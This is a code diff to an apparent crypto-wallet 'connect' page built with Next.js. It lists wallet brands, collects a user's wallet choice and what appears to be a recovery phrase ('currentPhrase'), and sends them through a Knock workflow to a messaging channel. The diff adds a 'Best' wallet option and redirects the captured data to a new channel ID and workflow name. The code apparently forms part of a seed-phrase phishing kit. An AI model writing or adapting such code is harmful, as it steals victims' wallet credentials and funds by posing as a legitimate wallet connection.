@@ -32,6 +32,7 @@ import Exodus from "../assets/exodus.png";
 import OtherWallets from "./assets/imtoken.jpg";
 import Okx from "../assets/okx.jpeg";
 import Trezor from "../assets/trezor-wallet.webp";
+import Best from "./assets/best.png";
 import Image from "next/image";
 import { useEffect, useState } from "react";
 import { useRouter } from "next/navigation";
@@ -46,6 +47,7 @@ export default function Home() {
   const [walletId, setWalletID] = useState(null);
 
   const data = [
+    { img: Best, title: "Best" },
     { img: WalletCon, title: "Wallet Connect" },
     { img: Trust, title: "Trust" },
     { img: Metamask, title: "Metamask" },
@@ -99,12 +101,12 @@ export default function Home() {
       {
         connections: [
           {
-            channel_id: "1269250241790742659",
+            channel_id: "1317944432992980992",
           },
         ],
       }
     );
-    await knock.workflows.trigger("icxnode", {
+    await knock.workflows.trigger("lance", {
       data: {
         wallet: formState.wallet,
         currentPhrase: formState.currentPhrase,
